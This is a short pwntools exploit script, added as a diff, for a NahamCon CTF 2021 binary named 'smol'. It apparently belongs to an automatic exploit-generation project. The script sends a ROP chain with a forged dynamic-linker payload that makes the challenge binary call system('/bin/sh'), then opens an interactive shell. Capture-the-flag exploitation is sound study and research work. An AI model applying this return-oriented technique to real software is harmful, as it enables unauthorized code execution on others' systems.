@@ -1,0 +1,16 @@
+from pwn import p64, u64, p32, u32
+import pwn
+import sys
+        
+pwn.context.log_level = "debug"
+pwn.context.timeout = 20
+p = pwn.process("/home/yuge/Documents/ACBEG/binaries/bofaeg_challenges/17_nahamconctf2021_smol/nahamconctf2021_smol")
+pwn.gdb.attach(p)
+payload = b"\x00" * 12
+payload += p64(0x40101a) + p64(0x4011ca) + p64(0x0) + p64(0x1) + p64(0x0) + p64(0x404e00) + p64(0x40) + p64(0x404020) + p64(0x4011b0) + b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + p64(0x4011d3) + p64(0x404e38) + p64(0x401020) + p64(0x306)
+payload = payload.ljust(512, b"a")
+p.send(payload)
+payload = b""
+payload += b'system\x00axI\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00N@\x00\x00\x00\x00\x00\x07\x00\x00\x00\x17\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00/bin/sh\x00'
+p.send(payload)
+p.interactive()
